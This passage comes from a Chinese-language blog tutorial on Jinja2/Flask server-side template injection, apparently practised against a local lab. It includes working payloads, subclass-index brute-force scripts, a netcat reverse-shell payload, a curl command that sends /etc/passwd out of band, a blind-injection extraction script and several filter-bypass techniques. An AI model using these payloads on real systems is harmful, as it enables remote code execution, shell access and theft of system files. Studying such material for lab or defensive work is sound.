<span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>可以加载第三方库，使用load_module加载os</p><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls -l /opt").read()&#125;&#125;</code></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_11.png" alt=""></p><h2 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h2><p><strong>linecache</strong>函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用这个linecache函数去执行命令</p><p>python脚本查找linecache</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h2><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值</p><p>subprocess可以替代其他几个老的模块或者函数，比如：os.system、os.popen等</p><p>python脚本查找subprocess.Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[200](&#x27;ls /&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_12.png" alt=""></p><h1 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h1><h2 id="SSTI盲注思路"><a href="#SSTI盲注思路" class="headerlink" title="SSTI盲注思路"></a>SSTI盲注思路</h2><p><strong>反弹shell</strong></p><ul><li>通过rce反弹一个shell出来绕过无回显的页面</li></ul><p><strong>带外注入</strong></p><ul><li>通过requestbin或dnslog的方式将信息传到外界</li></ul><p><strong>纯盲注</strong></p><ul><li>需要一定的回显</li></ul><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>没有回显，直接使用脚本批量执行希望执行的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/3&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;nc 192.168.17.129 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>查找包含popen的子类来执行命令</p><p>同时kali监听端口（nc -lvp 7777）</p><h2 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h2><p>此处也可以使用wget方法来带外想要知道的内容，也可以使用dnslog或者nc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/3&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.17.129/`cat /etc/passwd`&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>同时kali开启一个python http监听（<code>python3 -m http.server 80</code>）</p><h2 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/1&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    postdata = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url,data=postdata)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Spongebob&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&quot;os&quot;].popen(&quot;cat /etc/passwd&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot;%&#125;Spongebob&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password +=c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><h2 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h2><p><strong>使用介绍</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125;是属于flask的控制语句，且以&#123;% end... %&#125;结尾，可以通过在控制语句定义变量或者写循环判断</span><br></pre></td></tr></table></figure><p><strong>举例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        &#123;% for i in range(500) %&#125;</span><br><span class="line">        &#123;% if i &gt; 200 %&#125;</span><br><span class="line">        &#123;&#123;i&#125;&#125;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &#123;&#123;i-1&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>解题思路</strong></p><p>判断<code>&#123;&#123;&#125;&#125;</code>被过滤，尝试<code>&#123;% %&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 2&gt;1 %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">判断语句能否正常执行</span><br><span class="line"></span><br><span class="line">&#123;% if &#x27;&#x27;.__class__ %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">有回显Spongebob说明&#x27;&#x27;.__class__有内容</span><br><span class="line"></span><br><span class="line">&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">如果有回显Spongebob则说明命令正常执行</span><br><span class="line"></span><br><span class="line">&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read())%&#125;</span><br><span class="line">使用print()执行代码</span><br></pre></td></tr></table></figure><p>构造脚本查询可使用”popen”的子类编号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/2&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;Spongebob&#123;%endif%&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Spongebob&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="绕过过滤中括号"><a href="#绕过过滤中括号" class="headerlink" title="绕过过滤中括号"></a>绕过过滤中括号</h2><h3 id="getitem-魔术方法"><a href="#getitem-魔术方法" class="headerlink" title="_getitem_()魔术方法"></a>_<em>getitem_</em>()魔术方法</h3><p><code>__getitem__()</code>是python的一个魔术方法</p><ul><li>对字典使用时，传入<strong>字符串</strong>返回字典相应键所对应的值</li><li>对列表使用时，传入<strong>整数</strong>返回列表对应索引的值</li></ul><p><strong>demo</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;海绵宝宝&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;派大星&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;章鱼哥&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        b = self.a[key]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">t = test()</span><br><span class="line"><span class="built_in">print</span>(t[<span class="string">&#x27;1&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="WAF过滤-例题"><a href="#WAF过滤-例题" class="headerlink" title="WAF过滤[]例题"></a>WAF过滤[]例题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;# 先检测双大括号是否过滤</span><br><span class="line">&#123;&#123;&#x27;&#x27;&#125;&#125;或&#123;&#123;&quot;&quot;&#125;&#125;等# 检测是否过滤符号</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;# 检测是否有下划线过滤或者特殊字符</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[]&#125;&#125;# 到此步骤后发现有waf字样 </span><br><span class="line">使用__getitem__()可获取列表某一个值，可替代[]</span><br></pre></td></tr></table></figure><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_13.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_14.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_15.png" alt=""></p><p>python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/4&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,response.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>使用<code>__getitem__()</code>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过单双引号过滤"><a href="#绕过单双引号过滤" class="headerlink" title="绕过单双引号过滤"></a>绕过单双引号过滤</h2><p><strong>request</strong></p><ul><li>request在flask中可以访问基于HTTP请求传递的所有信息，此request并非python的函数，而是在flask内部的函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># 获取get传入的key的值</span></span><br><span class="line">request.values.x1<span class="comment"># 所有参数</span></span><br><span class="line">request.cookies<span class="comment"># 获取cookies传入参数</span></span><br><span class="line">request.headers<span class="comment"># 获取请求头请求参数</span></span><br><span class="line">requests.form.key<span class="comment"># 获取post传入参数（Content-Type: application/x-www-form-urlencoded或multipart/form-data）</span></span><br><span class="line">request.data<span class="comment"># 获取post传入参数（Content-Type: a/b）</span></span><br><span class="line">request.json<span class="comment"># 获取post传入json参数（Content-Type: application/json）</span></span><br></pre></td></tr></table></figure><p>在构造payload时大多会用到单双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以通过构造带参数的url，配合request获取参数的内容来组成想要提交的指令，从而绕过单双引号的使用</p><p>request模块所在位置<code>os._wrap_close</code>内可以执行，因此查找该模块所在位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/5&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,response.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>GET提交构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">URL?a=popen&amp;b=cat /etc/passwd</span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.args.a)(request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>POST提交构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.form.k1)(request.form.k2).read()&#125;&#125;&amp;k1=popen&amp;k2=cat /etc/passwd</span><br></pre></td></tr></table></figure><p>cookie提交构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.cookies.k1)(request.cookies.k2).read()&#125;&#125;</span><br><span class="line">Cookie: k1=popen;k2=cat /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="过滤器绕过下划线"><a href="#过滤器绕过下划线" class="headerlink" title="过滤器绕过下划线"></a>过滤器绕过下划线</h2><p><strong>过滤器</strong></p><ul><li>过滤器通过管道符号<code>|</code>与变量连接，并且在括号中可能有可选的参数</li></ul><p>flask常用过滤器</p><blockquote><p><code>length()</code> 获取一个序列或者字典的长度并将其返回</p><p><code>int()</code> 将值转换为int类型</p><p><code>float()</code> 将值转换为float类型</p><p><code>lower()</code> 将字符串转换为小写</p><p><code>upper()</code> 将字符串转换为大写</p><p><code>reverse()</code> 反转字符串</p><p><code>replace(value,old,new)</code> 将value中的old替换为new</p><p><code>list()</code> 将变量转换为列表类型</p><p><code>string()</code> 将变量转换成字符串类型</p><p><code>join()</code> 将一个序列中的参数值拼接成字符串，通常由pytohn内置的dict()配合使用</p><p><code>attr()</code> 获取对象的属性</p></blockquote><p><strong>attr绕过下划线过滤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">1. 使用request方法</span><br><span class="line">GET提交：?cla=__class__</span><br><span class="line">POST提交：code=&#123;&#123;()|attr(request.args.cla)&#125;&#125;</span><br><span class="line"></span><br><span class="line">2. 使用unicode编码</span><br><span class="line">3. 使用16位编码</span><br><span class="line">4. base64编码</span><br><span class="line">5. 格式化字符串</span><br></pre></td></tr></table></figure><h2 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h2><p>点<code>.</code>被过滤</p><ul><li>用中括号<code>[]</code>代替点</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;cat /etc/passwd&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>用<code>attr()</code>绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(199)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><p><strong>关键字绕过</strong></p><ul><li>过滤了<code>class,arg,from,value,int,global</code>等关键字</li></ul><p>以<code>__class__</code>为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 字符编码</span><br><span class="line">2. 最简单拼接&quot;+&quot;：&#x27;__cl&#x27;+&#x27;ass__&#x27;</span><br><span class="line">3. 使用jinja2的~进行拼接：&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss_&quot;%&#125;&#123;&#123;()a~b&#125;&#125;</span><br><span class="line">4. 使用过滤器(reverse反转、replace替换、join拼接等)：&#123;%set a=&quot;__ssacl__&quot;|reverse%&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">5. 利用python的char()：&#123;%set chr=url_for.globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure><h2 